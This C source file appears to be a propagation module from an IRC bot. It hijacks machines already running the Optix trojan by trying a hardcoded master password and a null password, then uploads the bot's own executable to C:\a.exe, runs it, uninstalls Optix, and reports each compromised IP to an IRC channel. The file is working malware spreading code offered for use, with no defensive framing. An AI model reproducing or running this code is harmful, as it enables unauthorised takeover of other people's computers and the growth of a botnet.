#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_OPTIX

BOOL Optix(EXINFO exinfo)
{
	char buffer[IRCLINE], szBuffer[64], szFilePath[MAX_PATH];

	int read = 0;

	WSADATA opxdata, upldata;
	SOCKET opxsock, uplsock;
	SOCKADDR_IN opxinfo, uplinfo;
	bool IS11 = FALSE;

	if (fWSAStartup(MAKEWORD(2,2), &opxdata) != 0) 
		return FALSE;

	//Connect To Optix Main Port
	opxinfo.sin_addr.s_addr = finet_addr(exinfo.ip);
	opxinfo.sin_port = fhtons((unsigned short)exinfo.port);		
	opxinfo.sin_family = AF_INET;
	opxsock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	start:
	if (fconnect(opxsock, (LPSOCKADDR)&opxinfo, sizeof(opxinfo)) == SOCKET_ERROR) {
		fclosesocket(opxsock);
		fWSACleanup();
		return FALSE;
	}

	//Auth
	//Note: OPTIX BLOCKS YA ASS UNTIL RESTART IF PASS IS WRONG 3TIMES :/
	if (IS11 == TRUE) 
		sprintf(szBuffer, "022¬kjui3498fjk34289890fwe334gfew4ger$\"sdf¬v1.1\r\n"); //MASTERPASSWORD = 1.1 Server
	else 
		sprintf(szBuffer, "022¬kjui3498fjk34289890fwe334gfew4ger$\"sdf¬v1.2\r\n"); //MASTERPASSWORD = 1.2 Server
	fsend(opxsock, szBuffer, strlen(szBuffer), 0);
	Sleep(500);

	memset(szBuffer, 0, sizeof(szBuffer));
	frecv(opxsock, szBuffer, sizeof(szBuffer), 0);
	//1.1 Check
	if (strstr(szBuffer, "001¬Your client version is outdated!") != NULL) { //1.1 Server
		IS11 = TRUE;
		fclosesocket(opxsock);
		goto start;
	}
	//All Others
	if (strstr(szBuffer, "001¬") == NULL) { //001 Should Be The Same On All Versions, Therefore strstr();
		Sleep(500);
		
		//If "OPtest" Dont Work, Try NULL Password
		if (IS11 == TRUE) 
			sprintf(szBuffer, "022¬¬v1.1\r\n"); //NULL Password, 1.1 Server
		else 
			sprintf(szBuffer, "022¬¬v1.2\r\n"); //NULL Password, 1.2 Server
		fsend(opxsock, szBuffer, strlen(szBuffer), 0);
		Sleep(500);

		memset(szBuffer, 0, sizeof(szBuffer));
		frecv(opxsock, szBuffer, sizeof(szBuffer), 0);
		if (strstr(szBuffer, "001¬") == NULL) { //001 Should Be The Same On All Versions, Therefore strstr();
			fclosesocket(opxsock);
			fWSACleanup();
			return FALSE;
		}
	}

	//Prepare Optix For Upload
	fsend(opxsock, "019¬\r\n", 6, 0);
	Sleep(500);

	memset(szBuffer, 0, sizeof(szBuffer));
	frecv(opxsock, szBuffer, sizeof(szBuffer), 0);
	if (strcmp(szBuffer, "020¬\r\n") != 0) {
		fclosesocket(opxsock);
		fWSACleanup();
		return FALSE;
	}

	//Get FilePath
	memset(szFilePath, 0, sizeof(szFilePath));
	GetModuleFileName(NULL, szFilePath, sizeof(szFilePath));
	//sprintf(szFilePath, szLocalPayloadFile);

	//Open File
	FILE *f = fopen(szFilePath, "rb");
	if (f == NULL) {	
		fclosesocket(opxsock);
		fWSACleanup();
		return FALSE;
	}

	//Connect To Upload Socket..
	if (fWSAStartup(MAKEWORD(2,2), &upldata) != 0) {
		fclosesocket(opxsock);
		fWSACleanup();
		return FALSE;
	}
	
	uplinfo.sin_addr.s_addr = finet_addr(exinfo.ip);
	uplinfo.sin_port = fhtons(500);		
	uplinfo.sin_family = AF_INET;
	uplsock = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (fconnect(uplsock, (LPSOCKADDR)&uplinfo, sizeof(uplinfo)) == SOCKET_ERROR) {
		fclosesocket(uplsock);
		fclosesocket(opxsock);
		fWSACleanup();
		return FALSE;
	}
	
	//Send File Info (Where To Upload And Size..)
	HANDLE hFile = CreateFile(szFilePath, GENERIC_READ,FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	DWORD dwSize = GetFileSize(hFile, 0);
	CloseHandle(hFile);

	sprintf(szBuffer, "C:\\a.exe\r\n%d\r\n", dwSize);
	fsend(uplsock, szBuffer, strlen(szBuffer), 0);
	Sleep(500);

	memset(szBuffer, 0, sizeof(szBuffer));
	frecv(uplsock, szBuffer, sizeof(szBuffer), 0);

	//OK REDY Received, Upload File..
	if (strstr(szBuffer, "+OK REDY") == NULL) {
		fclosesocket(uplsock);
		fclosesocket(opxsock);
		fWSACleanup();
		return FALSE;
	}

	//Upload \o/
	memset(szBuffer, 0, sizeof(szBuffer));
	while (!feof(f)) {
		read = fread(szBuffer, sizeof(char), sizeof(szBuffer), f);
		fsend(uplsock, szBuffer, read, 0);
	}

	memset(szBuffer, 0, sizeof(szBuffer));
	frecv(uplsock, szBuffer, sizeof(szBuffer), 0);

	//Execute File If Upload Success
	if (strstr(szBuffer, "+OK RCVD") != NULL) {
		fclosesocket(uplsock);
		fsend(opxsock, "008¬C:\\a.exe\r\n", 14, 0);
		Sleep(500);

		memset(szBuffer, 0, sizeof(szBuffer));
		frecv(opxsock, szBuffer, sizeof(szBuffer), 0);
		if (strcmp(szBuffer, "001¬Error Executing File\r\n") == 0) {
			fclosesocket(uplsock);
			fclosesocket(opxsock);
			fWSACleanup();
			return FALSE;
		}
	} else {
		fclosesocket(uplsock);
		fclosesocket(opxsock);
		fWSACleanup();
		return FALSE;
	}	

	//Remove Optix Server
	fsend(opxsock, "100¬\r\n", 6, 0);
	fclosesocket(uplsock);
	fclosesocket(opxsock);
	fWSACleanup();

	_snprintf(buffer, sizeof(buffer), "[%s]: Exploiting IP: %s.", exploit[exinfo.exploit].name, exinfo.ip);
	if (!exinfo.silent) irc_privmsg(exinfo.sock, exinfo.chan, buffer, exinfo.notice);
	addlog(buffer);
	exploit[exinfo.exploit].stats++;

	return TRUE;
}
#endif